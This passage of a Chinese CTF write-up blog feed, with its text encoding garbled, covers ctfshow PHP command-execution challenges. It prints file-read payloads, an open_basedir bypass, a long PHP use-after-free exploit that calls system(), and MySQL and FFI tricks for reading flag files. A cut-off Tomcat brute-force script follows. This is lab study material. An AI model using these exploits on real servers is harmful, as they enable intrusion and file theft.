alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>å¼€å±æš´å‡»ï¼ï¼ï¼</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>åŒä¸Š</p><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>åŒä¸Š</p><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p>å…ˆè¯•äº†è¯•payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/df017f5918ad457a9256733b52626d1d.png" alt="img"></p><p>å‘ç°é¢˜ç›®ç»™äº†é™„ä»¶åº·åº·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>ob_end_clean â€” æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</p><p>æ„Ÿè§‰è¦å¯„äº†ï¼ŒçœŸæ²¡æ€è·¯äº†</p><p>çœ‹äº†payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>é™åˆ¶äº†includeè·¯å¾„æœ‰ç‚¹å¤ªç»äº†</p><p>å­¦ä¹ äº†æ–°çš„å§¿åŠ¿</p><h3 id="glob-â€”-æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼"><a href="#glob-â€”-æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼" class="headerlink" title="glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼"></a>glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</h3><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121916703">(43æ¡æ¶ˆæ¯) ç»•è¿‡open_basedirçš„é™åˆ¶_unexpectedthingçš„åšå®¢-CSDNåšå®¢</a></p><p>è´´ä¸€ç¯‡æ–‡ç« æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤¹</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&#x27;glob:///*&#x27;);</span><br><span class="line">foreach($dir as $d)&#123;</span><br><span class="line">    echo $d-&gt;__toString().&#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">?&gt;</span><br><span class="line">//urlç¼–ç </span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•åˆ©ç”¨èšå‰‘</p><p>å‘ç°flag0.txt</p><p>å› ä¸ºincludeè¢«è·¯å¾„é™åˆ¶äº†ï¼Œè¯•äº†è¯•uafï¼Œå¾ˆå¼ºè¯»å–flag</p><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?php</span><br><span class="line"></span><br><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p>å…ˆè¯•äº†ä¸‹UAFï¼Œç»“æœé¡µé¢è¿”å›UAF failed</p><p>é‚£å…ˆç”¨glob://æ¢æ¢è·¯ï¼Œå‘ç°/flagc.txt</p><p><img src="https://img-blog.csdnimg.cn/e3919cd7b12d412fa62b7675a0cbf225.png" alt="img"></p><p>å‘ç°é‡å†™strlençš„æ–¹æ³•ï¼Œè¢«wafç›´æ¥æ‹¦æˆªã€‚</p><p>å†æ­¤ç”¨ä¸€ä¸ªæ–°æ–¹æ³•ï¼Œåˆ©ç”¨mysqlå»è®¿é—®è¿™ä¸ªæ–‡ä»¶å¹¶å°†å…¶æ‰“å°ï¼Œæ•°æ®åº“åå­—å’Œå¯†ç åœ¨å‰é¢å¯ä»¥æŸ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagc.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>æ–¹æ³•æœ‰äº›å‹‰å¼º</p><h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>è¿™é¢˜æ²¡äº†open_basedirçš„é™åˆ¶</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flagx.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>è¿™é¢˜è§£æ³•æœ‰äº›å‹‰å¼ºï¼Œæ¯•ç«Ÿæ˜¯è€ƒç‚¹å•ä¸€ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹æ€è·¯ã€‚</p><p>ä¾ç„¶æ˜¯åˆ©ç”¨glob://æŸ¥çœ‹æ ¹ç›®å½•</p><p>ç„¶ååˆ©ç”¨å…¶å®ƒåº”ç”¨å»è®¿é—®è¿™ä¸ªflagæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagc.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>åŒä¸Š</p><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>è¿™é¢˜getæ–°å§¿åŠ¿</p><p>é¢˜ç›®ä¸­è¯´æ˜¯php7.4</p><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><blockquote><p>FFIæ‰©å±•å·²ç»é€šè¿‡RFCï¼Œæ­£å¼æˆä¸ºPHP 7.4æ ¸å¿ƒæ‰©å±•ã€‚</p><p>ä»€ä¹ˆæ˜¯FFI</p><p>FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œæ˜¯æŒ‡åœ¨ä¸€ç§è¯­è¨€é‡Œè°ƒç”¨å¦ä¸€ç§è¯­è¨€ä»£ç çš„æŠ€æœ¯ã€‚PHPçš„FFIæ‰©å±•å°±æ˜¯ä¸€ä¸ªè®©ä½ åœ¨PHPé‡Œè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚</p><p>FFIçš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œåªç”¨å£°æ˜å’Œè°ƒç”¨ä¸¤æ­¥å°±å¯ä»¥ï¼Œå¯¹äºæœ‰Cè¯­è¨€ç»éªŒï¼Œä½†æ˜¯ä¸äº†è§£Zendå¼•æ“çš„ç¨‹åºå‘˜æ¥è¯´ï¼Œè¿™ç®€ç›´æ˜¯æ‰“å¼€äº†æ–°ä¸–ç•Œçš„å¤§é—¨ï¼Œå¯ä»¥å¿«é€Ÿåœ°ä½¿ç”¨Cç±»åº“è¿›è¡ŒåŸå‹è¯•éªŒã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag&gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshowå‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;a href=&quot;#ctfshowå‘½ä»¤æ‰§è¡Œ&quot; class=&quot;headerlink&quot; title=&quot;ctfshowå‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;/a&gt;ctfshowå‘½ä»¤æ‰§è¡Œ&lt;/h1&gt;&lt;h2 id=&quot;web29&quot;&gt;&lt;a href=&quot;#web29&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowçˆ†ç ´</title>
    <link href="http://websec.space/2022/01/26/ctfshow%E7%88%86%E7%A0%B4/"/>
    <id>http://websec.space/2022/01/26/ctfshow%E7%88%86%E7%A0%B4/</id>
    <published>2022-01-25T16:00:00.000Z</published>
    <updated>2022-01-26T03:22:19.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshowçˆ†ç ´"><a href="#ctfshowçˆ†ç ´" class="headerlink" title="ctfshowçˆ†ç ´"></a>ctfshowçˆ†ç ´</h1><p>å¼€å§‹ç©</p><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><blockquote><p>çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“</p></blockquote><p>ç¡®å®æ˜¯åŸºæ“ï¼Œä¸‹é¢æ¼”ç¤ºä¸¤ç§æ–¹æ³•ã€‚è¿™é¢˜æ˜¯ä¸ªtomcatçš„è®¤è¯ã€‚</p><p>æ³•ä¸€ï¼šbpçš„intruder</p><p><img src="https://img-blog.csdnimg.cn/fb5a6dc0f46747918903fac9c87a495f.png" alt="img" style="zoom:80%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>ç¡®å®šå¥½çˆ†ç ´ä½ç½®ï¼Œé€‰æ‹©ç±»å‹Custom iterator</p><p><img src="https://img-blog.csdnimg.cn/906e644163734867a9a572c55b14303b.png" alt="img"></p><p>å¯¼å…¥é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œè¿›è¡Œbase64ç¼–ç ï¼Œå¼€å§‹æ”»å‡»ï¼</p><p><img src="https://img-blog.csdnimg.cn/0a99e2128f6449e8918fb083ae0da5b7.png" alt="img"></p><p>æ‰¾åˆ°ç›¸åº”é•¿åº¦æœ€å¼‚å¸¸çš„åŒ…ï¼Œå‘ç°flag</p><p><img src="https://img-blog.csdnimg.cn/32704e370229479293561c3006cb4adb.png" alt="img"></p><p>æ³•äºŒï¼š</p><p>pythonè„šæœ¬ï¼Œè¿™é‡Œè´´å‡ºå®˜æ–¹ç»™çš„ï¼ˆä¸»è¦è‡ªå·±æ‡’å¾—å»å†™äº†ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = f.readline() </span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">    password.append(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic 